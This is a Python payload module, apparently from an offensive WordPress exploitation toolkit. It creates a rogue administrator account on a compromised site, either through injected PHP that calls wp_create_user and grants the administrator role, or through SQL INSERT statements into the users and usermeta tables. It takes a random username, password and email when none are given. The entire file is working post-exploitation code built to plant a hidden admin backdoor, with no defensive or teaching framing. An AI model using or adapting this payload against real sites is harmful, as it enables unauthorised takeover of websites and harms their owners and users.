"""
HWP Payload — Create Admin User

Creates a WordPress administrator account.
Supports RCE (PHP) and SQLi (direct INSERT).

Options:
    --user      Username (default: random)
    --pass      Password (default: random)
    --email     Email (default: random)
"""

import random
import string

from hwp import Payload


def _rand(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class AdminUser(Payload):
    name = "Create Admin User"
    methods = ["RCE", "SQLINJ"]
    description = "Create a WordPress admin account"
    options = [
        {"name": "user",  "default": "",  "help": "Username (blank = random)"},
        {"name": "pass",  "default": "",  "help": "Password (blank = random)"},
        {"name": "email", "default": "",  "help": "Email (blank = random)"},
    ]

    def instructions(self):
        user = self.options.get("user", "") or _rand()
        password = self.options.get("pass", "") or _rand(12)
        email = self.options.get("email", "") or f"{_rand()}@{_rand()}.com"

        self.info("Creating admin user:")
        self.info(f"  Username: {user}")
        self.info(f"  Password: {password}")
        self.info(f"  Email:    {email}")

        if self.method == "RCE":
            php = (
                f'<?php '
                f'$uid = wp_create_user("{user}", "{password}", "{email}"); '
                f'$u = new WP_User($uid); '
                f'$u->set_role("administrator"); '
                f'if (user_can($u, "administrator")) {{ echo "Admin Created"; }} '
                f'?>'
            )
            return [php]

        elif self.method == "SQLINJ":
            return [
                (
                    f"INSERT INTO {{$wpdb->users}} SET "
                    f"`user_login`='{user}', "
                    f"`user_email`='{email}', "
                    f"`user_pass`=MD5('{password}')"
                ),
                (
                    f"INSERT INTO {{$wpdb->usermeta}} SET "
                    f"`user_id`='{{prev.insert_id}}', "
                    f"`meta_key`='wp_capabilities', "
                    f"`meta_value`='a:1:{{s:13:\"administrator\";s:1:\"1\";}}'"
                ),
            ]

    def report(self, results):
        if any(r.success for r in results):
            self.success("Admin user created successfully")
